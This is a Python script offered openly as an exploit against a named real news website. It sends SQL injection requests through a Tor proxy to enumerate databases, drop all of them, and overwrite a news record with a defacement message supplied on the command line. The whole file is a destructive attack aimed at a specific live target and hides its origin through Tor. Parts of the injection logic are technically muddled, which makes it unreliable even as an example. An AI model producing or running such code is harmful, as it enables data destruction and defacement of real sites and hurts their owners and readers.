import requests
import sys

def exploit_gbhackers(message):
    # GBHackers index.php URL
    url = "https://gbhackers.com/index.php"

    # Retrieving all database names using SQL injection
    database_names = get_database_names()

    # Constructing an SQL payload to drop all databases
    payload_drop = "'; DROP DATABASE IF EXISTS " + "', '".join(database_names) + "; --"

    # Creating the exploit payload
    params = {
        'id': payload_drop
    }

    # Tor SOCKS5 proxy settings
    proxy = {'http': 'socks5://127.0.0.1:9050', 'https': 'socks5://127.0.0.1:9050'}

    # Sending the request to the GBHackers index.php page through the proxy
    r = requests.get(url, params=params, proxies=proxy)

    # Constructing an SQL payload to modify the index page content
    deface_message = f"'; UPDATE news SET title='{message}', content='{message}' WHERE id=1; --"

    # Creating the exploit payload
    params = {
        'id': deface_message
    }

    # Sending the request to the GBHackers index.php page through the proxy
    r = requests.get(url, params=params, proxies=proxy)

    # Displaying the response
    print(r.text)

def get_database_names():
    # URL to the GBHackers index.php page
    url = "https://gbhackers.com/index.php"

    # Using SQL injection (blind boolean-based) to get the database names
    query = "'; SELECT schema_name FROM information_schema.schemata;"

    # Creating the exploit payload
    params = {
        'id': query
    }

    # Tor SOCKS5 proxy settings
    proxy = {'http': 'socks5://127.0.0.1:9050', 'https': 'socks5://127.0.0.1:9050'}

    # Sending the request to the GBHackers index.php page through the proxy
    r = requests.get(url, params=params, proxies=proxy)

    # Extracting the database names from the response
    database_names = []
    for line in r.text.splitlines():
        line = line.strip()
        if "SCHEMA_NAME" in line:
            start = line.find("`") + 1
            end = line.find("`", start)
            database_names.append(line[start:end])

    return database_names

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 gbhackers_exploit.py 'your deface message'")
        sys.exit()

    message = sys.argv[1]

    exploit_gbhackers(message)

if __name__ == "__main__":
    main()